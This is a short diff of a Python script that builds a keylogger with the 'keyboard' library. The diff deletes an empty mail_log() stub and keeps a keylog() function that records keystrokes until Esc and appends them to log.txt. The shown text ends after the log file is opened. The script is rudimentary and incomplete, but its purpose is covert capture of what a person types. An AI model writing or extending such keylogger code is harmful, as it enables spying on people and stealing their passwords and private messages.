@@ -1,9 +1,6 @@
 import keyboard as kb
 import time
 
-def mail_log():
-    pass
-
 def keylog():
     logger_obj = kb.record(until = 'Esc')
     log_f = open("log.txt",'a')
